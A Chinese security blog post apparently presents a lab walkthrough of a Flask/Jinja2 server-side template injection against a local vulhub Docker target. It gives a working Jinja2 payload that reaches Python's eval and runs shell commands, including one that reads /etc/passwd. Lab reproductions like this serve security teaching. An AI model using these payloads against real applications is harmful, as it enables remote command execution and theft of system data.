#  漏洞复现&服务端模板注入（SSTI）漏洞  
原创 建哥聊安全
                        建哥聊安全  建哥聊安全   2026-11-02 02:21  
  
# 免责声明：严格禁止对任何未授权系统/网络进行扫描、攻击或入侵。禁止制作/传播恶意程序，禁止参与任何网络犯罪。如擅自将本文实验技术用于非法用途，一切法律后果及责任由行为人独立承担，与作者无关。  
  
Flask（Jinja2）服务端模板注入（SSTI）漏洞  
## 实验目的  
  
通过本实验，掌握服务端模板注入（  
SSTI）漏洞原理和利用方法，利用命令执行漏洞获取敏感信息。  
## 实验环境  
  
·  
   
操作机：  
Win10  
  
用户名：  
Administrator  
  
密码：Aa123  
!7890  
  
·  
   
靶机：  
Ubuntu + docker  
  
用户名：  
root  
  
密码：  
Aa123  
!7890  
  
·  
   
实验地址：  
http://靶机ip:8000?name={{233*233}}  
  
靶机环境搭  
建建  
议参考开源的**DVWA 、Pikachu等**  
## 实验原理  
  
注入类型的漏洞，常见  
Web注入有：SQL注入，XSS注入，XPATH注入，XML注入，代码注入，命令注入等等。注入漏洞的实质是服务端接受了用户的输入，未过滤或过滤不严谨执行了拼接了用户输入的代码，因此造成了各类注入。而服务端模板注入和常见Web注入的成因一样，也是服务端接收了用户的输入，将其作为Web应用模板内容的一部分，在进行目标编译渲染的过程中，执行了用户插入的恶意内容，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题。其影响范围主要取决于模版引擎的复杂性。  
  
Flask是一个使用Python编写的轻量级Web应用框架。其WSGI工具箱采用Werkzeug，模板引擎则使用Jinja2。  
## 实验步骤  
### 第一步 启动目标靶机的环境  
  
1、登陆"Flask"靶机，执行如下命令，进入目标环境所在目录  
  
cd /vulhub-master  
  
cd flask  
  
cd ssti  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/QJTLZsy5trGeeghibZWRO4s5wxsCRVbUKUh5qg88FFMocqEvMgvTicsk1nalSpoORq8xiaa8xlX7TtN4NiafK63gHhXKR8NJFp5lTYfYAthZXX4/640?wx_fmt=png&from=appmsg "")  
  
2、执行以下命令，运行目标靶机的环境  
  
docker-compose up -d  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/QJTLZsy5trEVktSVhgjP9cb4jCOcc16O6pD3DOK3DuQu8dBJjdKwdh26s0g4ghgoxgibTfO4ibz4C3t8ib587M4DqW3DRhicsibUY4m0a4xnyVkE/640?wx_fmt=png&from=appmsg "")  
  
3、登录“Attack”操作机，打开浏览器，访问http://靶机ip:8000，看到Hello页面，说明靶机环境启动成功  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QJTLZsy5trH06FKGiabVKkOibtelJcTuIAWjeiarrlVZbYJSDiaDoXic55MkmX4w9T7dYc17icjknsTFPgksfngne6pLcg8qMqsMqSWCWs8zu7K9Q/640?wx_fmt=png&from=appmsg "")  
  
### 第二步 漏洞复现  
  
4、通过“Attack”操作机的浏览器访问http://靶机ip:8000?name={{233*233}}，得到54289，说明SSTI漏洞存在  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/QJTLZsy5trHGUxWibGciaicyp7Wo66tNHYdgC8q7mXSSFjoAmE9eT9ibBRibyac2cMfphGrMxCCnHqUoMyMJ4mxY5HlGia51gh8Ku6fnfwmbyyu4A/640?wx_fmt=png&from=appmsg "")  
  
5、将name参数的值更换为如下代码（获取eval函数并执行任意python代码的POC），执行命令成功  
  
{% for c in [].__class__.__base__.__subclasses__() %}  
  
{% if c.__name__ == 'catch_warnings' %}  
  
  {% for b in c.__init__.__globals__.values() %}  
  
  {% if b.__class__ == {}.__class__ %}  
  
    {% if 'eval' in b.keys() %}  
  
      {{ b['eval']('__import__("os").popen("id").read()') }}  
  
    {% endif %}  
  
  {% endif %}  
  
  {% endfor %}  
  
{% endif %}  
  
{% endfor %}  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QJTLZsy5trFnnUGBOXJSCNXibiar0DbpP1TIEiaSiaBqVB1dHoJPr6KnmccGpXfmmzbEmrTiaicbDBWiaoicVrcHNFiaXAiaiam2Cice893oB0LBBUsz97A/640?wx_fmt=png&from=appmsg "")  
  
  
6、将上一步所用POC代码中的“id”处修改为“cat /etc/passwd”，即：  
  
{% for c in [].__class__.__base__.__subclasses__() %}  
  
{% if c.__name__ == 'catch_warnings' %}  
  
  {% for b in c.__init__.__globals__.values() %}  
  
  {% if b.__class__ == {}.__class__ %}  
  
    {% if 'eval' in b.keys() %}  
  
      {{ b['eval']('__import__("os").popen("cat /etc/passwd").read()') }}  
  
    {% endif %}  
  
  {% endif %}  
  
  {% endfor %}  
  
{% endif %}  
  
{% endfor %}  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QJTLZsy5trFE1vQ1zKyGOmFlIbaOxAHfbibBZtNSvYnXaA2sr6xQibzrOfoiaEPaDAtOCus39ic2gmLpCZUZMj1mYYwS76ICk9LC6tBmGVKY24w/640?wx_fmt=png&from=appmsg "")  
## 实验总结  
  
 通过本实验，通过复现  
Flask（Jinja2）服务端模板注入（SSTI）漏洞，了解模板注入涉及的是服务端Web应用使用模板引擎渲染用户请求的过程，服务器模板中拼接了恶意用户输入导致各种漏洞。  
  
 往期推荐：  
  
2026护网行动红队高危漏洞排查通知｜附自查清单  
  
紧急预警｜PHP php2shell高危漏洞，无需认证可RCE！  
  
PHP封装伪协议之一句话木马  
  
一篇教会你自查账户有无水平越权  
  
赶紧检查你的系统存不存在这个漏洞？  
  
 更多学习资料点击头像关注  
公众号，  
后台私信回复666即可领取视频学习资料。  
  
推荐以下书籍配合实验一起理解，适用零基础想学习网安的小白！！  
  
  
  
